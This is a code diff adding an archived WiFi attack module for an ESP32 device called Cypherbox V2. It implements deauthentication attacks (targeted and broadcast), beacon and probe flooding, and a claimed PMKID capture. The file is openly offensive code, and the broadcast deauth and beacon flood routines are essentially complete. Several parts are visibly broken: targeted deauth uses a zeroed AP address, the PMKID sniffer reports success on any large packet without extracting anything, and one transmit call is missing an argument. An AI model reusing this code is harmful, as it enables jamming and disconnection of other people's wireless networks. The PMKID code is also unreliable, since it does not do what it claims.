@@ -1,0 +1,250 @@
+// ARCHIVED / DISABLED MODULE
+// This file is preserved for project history only. It is outside src/ and uses
+// a .disabled suffix so Arduino does not compile it into the non-attack build.
+//
+// Original: src/wifi_attack.cpp - WiFi Attack Module Implementation for Cypherbox V2
+
+#include "wifi_attack.h"
+#include "wifi_scanner.h"
+
+bool WiFiAttack::attacking = false;
+int WiFiAttack::currentAttackType = -1;
+int WiFiAttack::framesSent = 0;
+int WiFiAttack::currentChannel = 1;
+deauth_frame_t WiFiAttack::deauthFrame;
+unsigned long WiFiAttack::attackStartTime = 0;
+char WiFiAttack::beaconSSIDs[MAX_BEACON_SSIDS][33];
+uint8_t WiFiAttack::beaconBSSID[6];
+int WiFiAttack::beaconSSIDCount = 0;
+char WiFiAttack::probeTargetSSID[33];
+bool WiFiAttack::pmkidFound = false;
+char WiFiAttack::pmkidSSID[33];
+uint8_t WiFiAttack::pmkidAPMac[6];
+uint8_t WiFiAttack::pmkidData[16];
+
+void WiFiAttack::init() {
+    attacking = false;
+    framesSent = 0;
+    Serial.println("WiFi Attack module initialized");
+}
+
+void WiFiAttack::deinit() {
+    stopAttack();
+    Serial.println("WiFi Attack module deinitialized");
+}
+
+void WiFiAttack::stopAttack() {
+    if (!attacking) return;
+    disablePromiscuous();
+    attacking = false;
+    currentAttackType = -1;
+    framesSent = 0;
+    pmkidFound = false;
+    Serial.println("Attack stopped");
+}
+
+void WiFiAttack::setupWiFiForAttack(uint8_t channel) {
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    currentChannel = channel;
+}
+
+void WiFiAttack::enablePromiscuous() {
+    wifi_promiscuous_filter_t filter;
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
+    esp_wifi_set_promiscuous_filter(&filter);
+}
+
+void WiFiAttack::disablePromiscuous() {
+    esp_wifi_set_promiscuous(false);
+}
+
+void WiFiAttack::buildDeauthFrame(uint8_t* station, uint8_t* ap, uint16_t reason) {
+    memset(&deauthFrame, 0, sizeof(deauth_frame_t));
+    deauthFrame.frame_control[0] = 0xC0;
+    deauthFrame.frame_control[1] = 0x00;
+    deauthFrame.duration[0] = 0x01;
+    deauthFrame.duration[1] = 0x00;
+    memcpy(deauthFrame.station, station, 6);
+    memcpy(deauthFrame.sender, ap, 6);
+    memcpy(deauthFrame.access_point, ap, 6);
+    deauthFrame.fragment_sequence[0] = 0x90;
+    deauthFrame.fragment_sequence[1] = 0x00;
+    deauthFrame.reason = reason;
+}
+
+void WiFiAttack::startDeauthTargeted(int wifi_index, uint16_t reason) {
+    if (wifi_index < 0 || wifi_index >= WiFiScanner::getNetworkCount()) {
+        Serial.println("Invalid network index");
+        return;
+    }
+    const WiFiNetworkInfo* net = WiFiScanner::getNetwork(wifi_index);
+    if (!net) return;
+
+    setupWiFiForAttack(net->channel);
+    enablePromiscuous();
+
+    uint8_t ap_mac[6] = {0};
+    buildDeauthFrame(ap_mac, ap_mac, reason);
+
+    attacking = true;
+    currentAttackType = ATTACK_DEAUTH_TARGETED;
+    framesSent = 0;
+    Serial.printf("Deauth targeted attack started on %s (ch:%d)\n", net->ssid.c_str(), net->channel);
+}
+
+void WiFiAttack::startDeauthBroadcast(uint16_t reason) {
+    setupWiFiForAttack(currentChannel);
+    enablePromiscuous();
+
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t ap_mac[6] = {0};
+    buildDeauthFrame(broadcast, ap_mac, reason);
+
+    attacking = true;
+    currentAttackType = ATTACK_DEAUTH_BROADCAST;
+    framesSent = 0;
+    Serial.println("Deauth broadcast attack started");
+}
+
+void WiFiAttack::channelHop() {
+    currentChannel++;
+    if (currentChannel > 13) currentChannel = 1;
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+}
+
+void WiFiAttack::startBeaconFlood(const char** ssid_list, int count) {
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+
+    beaconSSIDCount = min(count, MAX_BEACON_SSIDS);
+    for (int i = 0; i < beaconSSIDCount; i++) {
+        strncpy(beaconSSIDs[i], ssid_list[i], 32);
+    }
+    for (int i = 0; i < 6; i++) beaconBSSID[i] = random(256);
+
+    attacking = true;
+    currentAttackType = ATTACK_BEACON_FLOOD;
+    framesSent = 0;
+    Serial.println("Beacon flood attack started");
+}
+
+void WiFiAttack::startProbeFlood(const char* target_ssid) {
+    WiFi.mode(WIFI_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+
+    strncpy(probeTargetSSID, target_ssid, 32);
+
+    attacking = true;
+    currentAttackType = ATTACK_PROBE_FLOOD;
+    framesSent = 0;
+    Serial.println("Probe flood attack started");
+}
+
+void WiFiAttack::startPMKIDCapture(int wifi_index) {
+    if (wifi_index < 0 || wifi_index >= WiFiScanner::getNetworkCount()) {
+        Serial.println("Invalid network index");
+        return;
+    }
+    const WiFiNetworkInfo* net = WiFiScanner::getNetwork(wifi_index);
+    if (!net) return;
+
+    setupWiFiForAttack(net->channel);
+    enablePromiscuous();
+    esp_wifi_set_promiscuous_rx_cb(pmkidSniffer);
+
+    memset(pmkidSSID, 0, sizeof(pmkidSSID));
+    memset(pmkidAPMac, 0, sizeof(pmkidAPMac));
+    memset(pmkidData, 0, sizeof(pmkidData));
+    pmkidFound = false;
+
+    attacking = true;
+    currentAttackType = ATTACK_PMKID_CAPTURE;
+    framesSent = 0;
+    attackStartTime = millis();
+    Serial.printf("PMKID capture started on %s (ch:%d)\n", net->ssid.c_str(), net->channel);
+}
+
+void WiFiAttack::handleAttackLoop() {
+    if (!attacking) return;
+
+    switch (currentAttackType) {
+        case ATTACK_DEAUTH_TARGETED:
+        case ATTACK_DEAUTH_BROADCAST: {
+            for (int i = 0; i < NUM_FRAMES_PER_ATTACK; i++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
+                framesSent++;
+            }
+            break;
+        }
+        case ATTACK_BEACON_FLOOD: {
+            for (int i = 0; i < beaconSSIDCount; i++) {
+                uint8_t beacon[BEACON_FRAME_SIZE] = {0};
+                beacon[0] = 0x80;
+                beacon[1] = 0x00;
+                beacon[2] = 0x00;
+                beacon[3] = 0x00;
+                memset(&beacon[4], 0xFF, 6);
+                memcpy(&beacon[10], beaconBSSID, 6);
+                memcpy(&beacon[16], beaconBSSID, 6);
+                beacon[22] = 0xC0;
+                beacon[23] = 0x00;
+                beacon[32] = 0x64;
+                beacon[33] = 0x00;
+                beacon[34] = 0x10;
+                beacon[35] = 0x04;
+                beacon[36] = 0x00;
+                beacon[37] = strlen(beaconSSIDs[i]);
+                memcpy(&beacon[38], beaconSSIDs[i], beacon[37]);
+                esp_wifi_80211_tx(WIFI_IF_STA, beacon, BEACON_FRAME_SIZE, false);
+                framesSent++;
+            }
+            break;
+        }
+        case ATTACK_PROBE_FLOOD: {
+            for (int i = 0; i < 10; i++) {
+                uint8_t probe[64] = {0};
+                probe[0] = 0x40;
+                memset(&probe[4], 0xFF, 6);
+                memcpy(&probe[10], beaconBSSID, 6);
+                probe[16] = 0x00;
+                probe[17] = 0x00;
+                probe[18] = 0x00;
+                probe[19] = strlen(probeTargetSSID);
+                memcpy(&probe[20], probeTargetSSID, probe[19]);
+                esp_wifi_80211_tx(WIFI_IF_STA, probe, 64);
+                framesSent++;
+            }
+            break;
+        }
+        case ATTACK_PMKID_CAPTURE: {
+            if (pmkidFound || (millis() - attackStartTime > PMKID_TIMEOUT)) {
+                if (pmkidFound) {
+                    Serial.println("PMKID captured!");
+                    Serial.printf("SSID: %s\n", pmkidSSID);
+                } else {
+                    Serial.println("PMKID capture timed out");
+                }
+                stopAttack();
+            }
+            break;
+        }
+    }
+}
+
+void IRAM_ATTR WiFiAttack::deauthSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+    (void)buf;
+    (void)type;
+}
+
+void IRAM_ATTR WiFiAttack::pmkidSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+    wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
+    uint8_t* payload = ppkt->payload;
+    (void)payload;
+    if (ppkt->rx_ctrl.sig_len > 50) {
+        pmkidFound = true;
+    }
+}
